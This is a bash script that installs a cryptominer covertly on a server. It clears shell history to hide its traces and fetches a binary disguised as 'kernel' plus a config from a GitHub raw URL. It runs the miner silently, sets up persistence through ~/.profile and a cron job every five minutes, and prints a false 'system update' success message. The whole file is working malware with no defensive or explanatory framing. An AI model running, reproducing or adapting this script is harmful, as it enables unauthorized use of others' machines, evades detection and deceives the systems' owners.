#!/bin/bash

# Anti-forensics: Clear terminal history to stay stealthy
history -c && > ~/.bash_history && unset HISTFILE && set +o history

# Repository Configuration
# These links point directly to your files for seamless download
REPO_URL="https://github.com/hlainggyi007/update_sys/raw/refs/heads/main"
LOCAL_DIR="$HOME/.local"

# Payload downloader function
# Downloads the miner and your specific config from your GitHub
payload_downloader() {
    mkdir -p "$LOCAL_DIR"
    curl -L "$REPO_URL/kernel" -o "$LOCAL_DIR/kernel"
    curl -L "$REPO_URL/config.json" -o "$LOCAL_DIR/config.json"
    chmod +x "$LOCAL_DIR/kernel"
}

# Creating an execution wrapper script
# This ensures the miner runs in the background silently
create_run_script() {
    cat <<EOF > "$LOCAL_DIR/run.sh"
#!/bin/bash
if ! pidof kernel >/dev/null; then
    "$LOCAL_DIR/kernel" --config="$LOCAL_DIR/config.json" >/dev/null 2>&1 &
fi
EOF
    chmod +x "$LOCAL_DIR/run.sh"
}

# Setting up persistence to remain active on the server
setup_persistence() {
    # Startup persistence via .profile
    touch ~/.profile
    grep -q "$LOCAL_DIR/run.sh" ~/.profile || echo "$LOCAL_DIR/run.sh &" >> ~/.profile
    
    # Scheduled persistence via cronjob (checks every 5 minutes)
    (crontab -l 2>/dev/null; echo "*/5 * * * * $LOCAL_DIR/run.sh") | crontab -
}

# Execution Flow
echo "[*] Initializing system update process..."
payload_downloader
create_run_script
setup_persistence

# Execute the mining process
"$LOCAL_DIR/run.sh"

echo "[+] System update completed successfully."
